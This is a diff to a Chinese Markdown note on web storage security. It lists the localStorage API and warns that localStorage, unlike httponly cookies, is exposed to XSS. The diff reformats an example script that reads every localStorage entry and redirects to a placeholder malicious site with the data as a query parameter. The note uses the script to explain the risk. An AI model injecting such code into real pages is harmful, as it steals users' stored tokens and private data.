@@ -5,10 +5,10 @@
 
 * 主要接口函数有下面几个：
 
-	Window.localStorage.setItem(key,value);//存储数据 
-	Window.localStorage.getItem(key);//读取数据 
-	Window.localStorage.removeItem(key);//删除数据项 
-	Window.localStorage.clear();//删除所有数据
+	Window.localStorage.setItem(key,value);//存储数据  
+	Window.localStorage.getItem(key);//读取数据  
+	Window.localStorage.removeItem(key);//删除数据项  
+	Window.localStorage.clear();//删除所有数据  
 
 ----
 
@@ -19,15 +19,16 @@
 * cookie有httponly等属性能够保护cookie不被xss攻击，但是localStorage就没有。一旦发生XSS，攻击者能够直接获得存储的信息。
 攻击代码示例：
 
-	var i = 0;
-	var str = "";
-	while (localStorage.key(i) != null)
-	{
-	    var key = localStorage.key(i); 
-	    str += key + ": " + localStorage.getItem(key);
-	    i++;
-	}
-	document.location="http://your-malicious-site.com?stolen="+ str;
+<pre><code>var i = 0;  
+var str = "";  
+while (localStorage.key(i) != null)  
+{  
+var key = localStorage.key(i);  
+	str += key + ": " + localStorage.getItem(key);  
+	i++;  
+}  
+document.location="http://your-malicious-site.com?stolen="+ str;
+</pre></code>
 
 ####容易遭受跨目录攻击
 
